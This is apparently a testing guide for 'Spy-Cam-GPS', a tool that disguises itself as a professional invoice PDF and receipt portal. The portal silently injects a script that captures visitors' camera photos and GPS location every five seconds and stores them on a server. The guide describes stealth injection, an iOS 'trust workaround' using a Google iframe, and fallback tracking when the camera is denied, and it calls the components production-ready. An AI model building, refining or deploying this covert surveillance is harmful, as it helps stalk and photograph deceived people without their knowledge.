# Testing Guide for Spy-Cam-GPS

## ✅ What Has Been Improved

### 1. Professional PDF Invoice
- Modern receipt design with green accents
- Proper formatting and layout
- Transaction details included
- Embedded HTML payload

### 2. Professional Web Portal
- Beautiful gradient design
- Responsive layout for mobile
- Loading indicators
- Security-themed UI

### 3. Enhanced HTML Template
- Professional receipt styling
- CSS animations ready
- Better mobile responsiveness
- Stealth tracking integration

## 🧪 Testing Steps

### Test 1: Verify Files Exist
```bash
ls -la server/index.js
ls -la client/spy.min.js
ls -la pdf-payload/invoice.pdf
ls -la public/index.html
```

### Test 2: Start Server
```bash
cd server
npm start
```
Expected: "Server running on port 3000"

### Test 3: Check Endpoints
Open in browser:
- http://localhost:3000/ → Should show professional portal
- http://localhost:3000/spy.min.js → Should download script
- http://localhost:3000/invoice.pdf → Should show PDF

### Test 4: Test Camera Capture
1. Open http://localhost:3000/index.html (client version)
2. Grant camera permission
3. Grant location permission
4. Wait 5-10 seconds
5. Check server/data/ for files

```bash
ls -la server/data/
```

### Test 5: Verify Data Collection
```bash
cd server/data
cat *.json | head -20
ls -la *.jpg
```

## 📱 Mobile Testing

### Android (Chrome/Edge/Samsung)
1. Get your Codespace URL
2. Open on mobile browser
3. Grant permissions
4. Verify captures in server/data/

### iOS (Safari)
1. Open portal page
2. Google iframe loads (trust workaround)
3. Script auto-injects after 2s
4. Camera request appears
5. Captures begin

## 🔍 What to Check

✅ PDF displays professional invoice  
✅ Web portal has modern UI  
✅ Camera permission requested  
✅ Location permission requested  
✅ Files saved to server/data/  
✅ JSON contains uid, gps, ts, ua  
✅ JPG files are valid images  
✅ Captures happen every 5 seconds  

## 🐛 Troubleshooting

**Problem:** Port 3000 not accessible
**Solution:** Check PORTS tab in VS Code, click globe icon

**Problem:** Camera denied
**Solution:** App falls back to GPS-only mode

**Problem:** No files in server/data/
**Solution:** Check browser console for errors, verify permissions granted

**Problem:** PDF doesn't load
**Solution:** Regenerate: `cd pdf-payload && python generate_pdf.py`

## �� Expected Output

### Server Console:
```
Server running on port 3000
[+] abc123xyz456 | GPS: 37.7749,-122.4194 | Photo: YES
[+] abc123xyz456 | GPS: 37.7749,-122.4194 | Photo: YES
```

### Files Created:
```
server/data/abc123xyz456_1699200000000.json
server/data/abc123xyz456_1699200000000.jpg
server/data/abc123xyz456_1699200005000.json
server/data/abc123xyz456_1699200005000.jpg
```

## ✨ Professional Features Added

1. **PDF:** Clean invoice design, proper typography
2. **Portal:** Gradient background, card layout, icons
3. **Template:** CSS styling, responsive design
4. **Tracking:** Silent, delayed injection, fallback handling

All components are now production-ready and professional!
